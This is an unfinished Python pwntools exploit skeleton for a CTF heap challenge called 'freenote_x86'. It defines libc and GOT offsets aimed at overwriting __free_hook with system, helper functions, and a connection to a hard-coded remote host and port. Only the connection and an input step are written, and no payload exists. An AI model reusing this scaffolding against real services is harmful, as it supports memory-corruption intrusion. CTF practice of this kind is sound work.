#coding:utf-8
from pwn import *

local=0
debug=1
#remotelibc=ELF("./libc.2.19.so")
locallibc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

remotelibc=locallibc
context.log_level='DEBUG'

raw_r =lambda :p.recv(timeout=1)
r=lambda x: p.recv(x)
ru=lambda x: p.recvuntil(x)
rud=lambda x:p.recvuntil(x,drop="true")
se=lambda x: p.send(x)
sel=lambda x: p.sendline(x)
shell = lambda :p.interactive()
clsconnection = lambda :p.close()
pick32=lambda x: u32(x[:4].ljust(4,'\0'))
pick64=lambda x: u64(x[:8].ljust(8,'\0'))


libc_local32={
    'base':0x0,
    'read':locallibc.symbols['read'],
    'system': locallibc.symbols['system'],
    '__free_hook':  locallibc.symbols['__free_hook'],
    'leaked': 0x1b27b0,
	'binsh':0x15ba0b,
}

libc_local64={
    'base':0x0,
    'leaked': 3951480,  #unsortedbin = __malloc_hook+0x68
    '__malloc_hook':locallibc.symbols['__malloc_hook'],
    'read':locallibc.symbols['read'],
    'system': locallibc.symbols['system'],
    '_IO_list_all':locallibc.symbols['_IO_list_all'],
    '__free_hook':  locallibc.symbols['__free_hook'],
}


libc_remote={
    'base':0x0,
    'read':remotelibc.symbols['read'],
    'leaked': 0x1b27b0,
	'__free_hook':remotelibc.symbols['__free_hook'],
	'system':remotelibc.symbols['system'],
	'binsh':0x0015900b,
}


elf={
    'base':0x0,
    'leaked':0xe3a,
    'free_got':0x202018,
	'global':0x3064,
	'before':0x3040,
}

if local:
    libc=libc_local64
else:
    libc=libc_remote

def set_base(mod,ref,addr):
    base=addr-mod[ref]
    for element in mod:
        mod[element] += base
#gdb.attach(p,gdbme)


def list():
    ru("choice:")
    sel("1")


def inputkey():
    ru("ckx")
    sel("A")






def exploit(target,port):
    global p
    if local:
        p=process("./freenote_x86")
    else:
        p=remote(target,port,timeout=1)


    inputkey()


    # p.interactive()



if __name__=='__main__':
    print "main ...."
    target = "202.112.51.152"
    port = 9999

    exploit(target,port)